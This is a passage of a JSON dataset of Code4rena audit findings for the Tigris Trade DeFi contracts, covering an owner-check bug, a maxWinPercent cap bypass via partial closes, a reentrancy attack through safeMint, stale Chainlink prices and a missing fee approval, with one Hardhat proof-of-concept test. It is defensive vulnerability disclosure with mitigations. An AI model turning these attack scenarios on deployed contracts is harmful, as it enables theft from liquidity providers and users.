      "summary": "\nThis bug report discusses a vulnerability in the contract \"GovNFT\" which allows users to bridge governance NFTs to other chains. The report outlines a scenario where a user can end up with multiple NFTs with the same token ID on different chains, which is not intended. This can lead to the user earning profits from the platform on multiple chains, which is not the intended behavior. The report suggests a mitigation step of tracking consumed messages and adding a consumed flag to prevent this scenario from happening. The severity of the bug is classified as medium and has been confirmed and resolved by the developers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/150",
      "tags": [],
      "finders": [
        "HE1M"
      ]
    },
    {
      "id": "43152",
      "title": "[M-04] Approved operators of Position token can't call Trading.initiateCloseOrder",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>\n\n### Impact\n\nApproved operators of owner of Position token can't call several function in Trading.\n\n### Proof of Concept\n\nFunctions that accept Position token in Trading are checking that the caller is owner of token using `\\_checkOwner` function. \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>\n\n```soldiity\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n```\n\nAs you can see this function doesn't allow approved operators of token's owner to pass the check. As a resul, functions are not possible to call for them on behalf of owner.\n\nFor example [here](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235), there is a check that doesn't allow to call initiateCloseOrder function.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAllow operators of token's owner to call functions on behalf of owner.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1385166664):**\n > The warden has shown how, due to an inconsistency between the check and the permissions, some functions will not work for an approved operator.\n> \n> Because some functions will, and the system seems to be written with the intention of allowing that functionality, I believe Medium Severity to be the most appropriate.\n\n**[GainsGoblin (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1400571072):**\n > @Alex the Entreprenerd We want to keep `_checkOwner()` the way it is currently implemented. For approving another address for trading on behalf of the user's address, we have the `approveProxy()` function.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem with the Trading contract in the Tigris project. The issue is that approved operators of the owner of a Position token are not able to call certain functions in the Trading contract. This is because the contract checks if the caller is the owner of the token using a function called `_checkOwner`, which does not allow approved operators to pass the check. This means that functions cannot be called on behalf of the owner by an approved operator. The bug report recommends allowing operators of the token's owner to call functions on behalf of the owner to fix this issue. The report also includes comments from a judge and the Tigris Trade team acknowledging and discussing the issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/124",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "UniversalCrypto",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "43151",
      "title": "[H-09] Users can bypass the `maxWinPercent` limit using a partially closing",
      "impact": "HIGH",
      "content": "\nUsers can bypass the `maxWinPercent` limit using a partial closing.\n\nAs a result, users can receive more funds than their upper limit from the protocol.\n\n### Proof of Concept\n\nAs we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.\n\n    Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\n\nAnd this logic was implemented like below in `_closePosition()`.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n```\n\nBut it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.\n\n1.  Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.\n2.  If `maxWinPercent` = 500%, Alice should receive 500 at most.\n3.  But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100`\n4.  After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.\n5.  As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\n\n### Recommended Mitigation Steps\n\nWe should check the `maxWinPercent` between the partial payout and partial margin like below.\n\n```solidity\n    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n\n    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++\n    if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { \n        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;\n    }\n```\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1364949926):**\n> I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1399445298):**\n > The Warden has shown how, by partially closing an order, it is possible to bypass the `maxWinPercent` cap.\n> \n> Per similar discussion to [#111](https://github.com/code-423n4/2022-12-tigris-findings/issues/111) the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.\n> \n> Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1407802166):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771 \n\n\n\n***\n\n",
      "summary": "\nThe report describes a bug in the Tigris Trade protocol where users can bypass the maximum profit limit by partially closing their position. This allows them to receive more funds than their limit from the protocol. The bug is caused by the logic implemented in the code, which checks the limit between the partial payout and full margin, rather than the partial margin. This allows users to repeatedly close a portion of their position and receive almost all of their initial profit, even though they should only receive a maximum of 500%. To fix this bug, the code should be updated to check the limit between the partial payout and partial margin. The severity of this bug is debated, with some labeling it as medium risk and others as high risk. The Tigris Trade team has resolved the issue by implementing the recommended mitigation steps.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/507",
      "tags": [],
      "finders": [
        "0xA5DF",
        "bin2chen",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "43150",
      "title": "[H-07] reentrancy attack during `mint()` function in Position contract which can lead to removing of the other user's limit orders or stealing contract funds because initId is set low value",
      "impact": "HIGH",
      "content": "\nFunction `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass `_checkDelay()` checks. Attacker can perform this action:\n\n1.  Call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code.\n2.  Call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.\n\n### Proof of Concept\n\nThis is `mint()` code in Position contract:\n\n        function mint(\n            MintTrade memory _mintTrade\n        ) external onlyMinter {\n            uint newTokenID = _tokenIds.current();\n\n            Trade storage newTrade = _trades[newTokenID];\n            newTrade.margin = _mintTrade.margin;\n            newTrade.leverage = _mintTrade.leverage;\n            newTrade.asset = _mintTrade.asset;\n            newTrade.direction = _mintTrade.direction;\n            newTrade.price = _mintTrade.price;\n            newTrade.tpPrice = _mintTrade.tp;\n            newTrade.slPrice = _mintTrade.sl;\n            newTrade.orderType = _mintTrade.orderType;\n            newTrade.id = newTokenID;\n            newTrade.tigAsset = _mintTrade.tigAsset;\n\n            _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage\n            if (_mintTrade.orderType > 0) { // update the values of some storage functions\n                _limitOrders[_mintTrade.asset].push(newTokenID);\n                _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n            } else {\n                initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n                _openPositions.push(newTokenID);\n                _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n                _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n                _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n            }\n            _tokenIds.increment();\n        }\n\nAs you can see by calling `_safeMint()`, code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. So code doesn't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.\n\nThere could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:\n\n**Scenario #1 where attacker removes other users limit orders and create broken storage state**\n\n1.  Attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1.\n2.  Then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check.\n3.  Variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list.\n4.  Attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`.\n5.  `cancelLimitOrder()` checks would pass and would try to call `Position.burn(ID1)`.\n6.  `burn()` function would try to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0, the code would remove the 0 index limit order which belongs to another user.\n7.  Execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.\n\nSo there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.\n\n**Scenario #2 where attacker steal contract/users funds by wrong profit calculation**\n\n1.  Attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low.\n2.  Code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address.\n3.  The value of `initId[ID1]` is not yet set for ID1.\n4.  Attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position.\n5.  Code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value would be based on the `newMargin`.\n6.  The execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value.\n7.  Then the value of `initId[ID1]` for attacker position would be very low, which would cause `accInterest` to be higher than it's supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.\n\nSo attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.\n\nThere can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nFollow the check-effect-interaction pattern.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/400)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1383811250):**\n> In contrast to other CEI reports, this report shows how control can be gained in the middle of the mint execution to create an inconsistent state.\n>\n> The warden has shown how, because `mint` doesn't follow CEI conventions, by reEntering via safeMint, an attacker can manipulate the state of limit orders, and also benefit by changing profit calculations.\n> \n> Because the finding shows how to break invariants and profit from it, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1407764413):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911 \n\n\n\n***\n\n",
      "summary": "\nThe function `Position.mint()` is used in two other functions, but it doesn't follow the check-effect-interaction pattern. This means that the values of certain variables are updated after an external call is made, which can create a wrong storage state and allow an attacker to manipulate the contract. This can result in the removal of other users' limit orders or the calculation of incorrect profits for the attacker. To fix this, the check-effect-interaction pattern should be followed and the code should be updated to prevent reentrancy attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/400",
      "tags": [],
      "finders": [
        "hihen",
        "rotcivegaf",
        "debo",
        "0xsomeone",
        "wait",
        "KingNFT",
        "stealthyz",
        "unforgiven",
        "mookimgo"
      ]
    },
    {
      "id": "6354",
      "title": "[M-24] Chainlink price feed is not sufficiently validated and can return stale price",
      "impact": "MEDIUM",
      "content": "\nAs mentioned by <https://docs.tigris.trade/protocol/oracle>, \"Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted.\" The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122>\n\n```solidity\n    function verifyPrice(\n        uint256 _validSignatureTimer,\n        uint256 _asset,\n        bool _chainlinkEnabled,\n        address _chainlinkFeed,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        mapping(address => bool) storage _isNode\n    )\n        external view\n    {\n        ...\n        if (_chainlinkEnabled && _chainlinkFeed != address(0)) {\n            int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n            if (assetChainlinkPriceInt != 0) {\n                uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n                require(\n                    _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n                    _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n                );\n            }\n        }\n    }\n```\n\nBased on <https://docs.chain.link/docs/historical-price-data>, the following can be done to avoid using a stale price returned by the Chainlink price feed.\n\n1.  The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function.\n2.  `roundId` and `answeredInRound` are also returned. \"You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.\"\n3.  \"A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.\"\n\n### Proof of Concept\n\nThe following steps can occur for the described scenario.\n\n1.  Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order.\n2.  When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset.\n3.  The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price.\n4.  Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113> can be updated to the following code.\n\n```solidity\n            (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();\n            require(answeredInRound >= roundId, \"price is stale\");\n            require(updatedAt > 0, \"round is incomplete\");\n```\n\n**[GainsGoblin (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1377551479):**\n > We don't want a trader's trade to revert just because the chainlink feed is a round behind.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1383083924):**\n > The Warden has pointed out to a possible risk related to the price oracle returning stale data.\n> \n> Alternatively to checking for latest round, a check for `updatedAt` to not be too far in the past should also help mitigate the risk of offering an incorrect price which can lead to value extraction or unintended behaviour.\n> \n> Because of the risk, I do agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1407824582):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177187 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `TradingLibrary.verifyPrice` function of the code-423n4/2022-12-tigris repository. This function is used to compare an off-chain price to a price returned by a Chainlink price feed. The problem is that the function uses Chainlink's deprecated `latestAnswer` function, which does not guarantee that the price returned by the Chainlink price feed is not stale. This means that if the off-chain price has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, making the price verification much less secure. \n\nTo avoid using a stale price returned by the Chainlink price feed, the `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. Additionally, `roundId` and `answeredInRound` are also returned, and can be checked against the current `roundId`. Finally, the timestamp on the round can be validated to make sure the round is complete.\n\nThe recommended mitigation step is to update the `TradingLibrary.verifyPrice` function to the code provided in the report. This code uses the `latestRoundData` function, checks the `roundId` and `answeredInRound` against the current `roundId`, and validates the timestamp on the round.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/655",
      "tags": [
        "Oracle",
        "Chainlink",
        "Stale Price"
      ],
      "finders": [
        "8olidity",
        "__141345__",
        "0x52",
        "fs0c",
        "Rolezn",
        "yixxas",
        "rbserver",
        "Jeiwan",
        "bin2chen",
        "joestakey",
        "ladboy233",
        "koxuan",
        "gzeon",
        "0xDecorativePineapple",
        "kwhuo68",
        "0xdeadbeef0x",
        "rvierdiiev",
        "eierina"
      ]
    },
    {
      "id": "6353",
      "title": "[M-23] Governance NFT holder, whose NFT was minted before Trading._handleOpenFees function is called, can lose deserved rewards after Trading._handleOpenFees function is called",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\n\n\n## Vulnerability details\n\n## Impact\nCalling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\n```solidity\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        ...\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            ...\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n```\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\n```solidity\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        ...\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n```\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\n```solidity\n    function distribute(address _tigAsset, uint _amount) external {\n        if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;\n        try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n            accRewardsPerNFT[_tigAsset] += _amount/totalSupply();\n        } catch {\n            return;\n        }\n    }\n```\n\n## Proof of Concept\nFunctions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.\n\nPlease add the following test in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.\n```typescript\n    it.only(\"Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called\", async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.\n      // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"0\");\n    });\n```\n\nFurthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\\Trading.sol`.\n```solidity\n689:     function _handleOpenFees(\n690:         uint _asset,\n691:         uint _positionSize,\n692:         address _trader,\n693:         address _tigAsset,\n694:         bool _isBot\n695:     )\n696:         internal\n697:         returns (uint _feePaid)\n698:     {\n699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n...\n732:         unchecked {\n733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n734:             _feePaid =\n735:                 _positionSize\n736:                 * (_fees.burnFees + _fees.botFees) // get total fee%\n737:                 / DIVISION_CONSTANT // divide by 100%\n738:                 + _daoFeesPaid;\n739:             emit FeesDistributed(\n740:                 _tigAsset,\n741:                 _daoFeesPaid,\n742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT,\n745:                 _referrer\n746:             );\n747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n748:         }\n749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose\n750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n751:     }\n```\n\nThen, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.\n```typescript\n    it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,\n             can receive deserved rewards after initiateMarketOrder function is called`, async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000\n      //   because her or his Governance NFT was minted before initiateMarketOrder function was called.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"10000000000000000000\");\n    });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749 can be updated to the following code.\n```solidity\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n```",
